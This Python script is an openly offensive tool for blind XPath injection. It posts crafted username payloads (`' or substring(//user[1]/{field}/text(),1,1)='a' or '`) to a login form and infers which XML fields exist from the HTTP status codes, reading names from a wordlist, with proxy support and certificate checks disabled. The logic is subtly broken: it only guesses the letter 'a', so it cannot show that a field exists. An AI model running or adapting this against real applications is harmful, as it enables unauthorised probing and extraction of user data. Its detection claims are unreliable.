#!/usr/bin/env python3
"""
blind_field_discovery.py

Performs blind field name discovery against an XML-backed application vulnerable to XPath injection.

This tool attempts to infer the existence of specific fields (element names) under a known parent node by sending crafted payloads and observing HTTP response behavior.

Usage:
    python3 blind_field_discovery.py --target http://127.0.0.1:5000 --wordlist fields.txt
"""

import argparse
import requests
import sys
import time

def parse_args():
    parser = argparse.ArgumentParser(description="Blind field name discovery via XPath injection.")
    parser.add_argument("--target", required=True, help="Target base URL (e.g. http://127.0.0.1:5000)")
    parser.add_argument("--proxy", help="Optional proxy server (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--wordlist", required=True, help="Path to field name wordlist")
    parser.add_argument("--output", default="discovered_fields.txt", help="File to write discovered field names")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests in seconds")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def load_wordlist(path):
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def build_payload(field, char_guess='a'):
    return f"' or substring(//user[1]/{field}/text(), 1, 1) = '{char_guess}' or '"

def test_field_exists(field, target, proxy=None, delay=0.0, verbose=False):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = f"username={build_payload(field)}&password=x"

    proxies = None
    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy
        }

    if delay:
        time.sleep(delay)

    response = requests.post(target, data=data, headers=headers, proxies=proxies, verify=False)

    if verbose:
        print(f"[*] Probed field: {field} | Status Code: {response.status_code}")

    return response.status_code == 200

def main():
    args = parse_args()

    candidates = load_wordlist(args.wordlist)
    discovered = []

    for field in candidates:
        if test_field_exists(field, args.target, args.proxy, args.delay, args.verbose):
            print(f"[+] Discovered field: {field}")
            discovered.append(field)

    if args.output:
        with open(args.output, 'w') as f:
            for field in discovered:
                f.write(f"{field}\n")

    print(f"\n[+] Field discovery completed. {len(discovered)} fields found.")

if __name__ == "__main__":
    main()
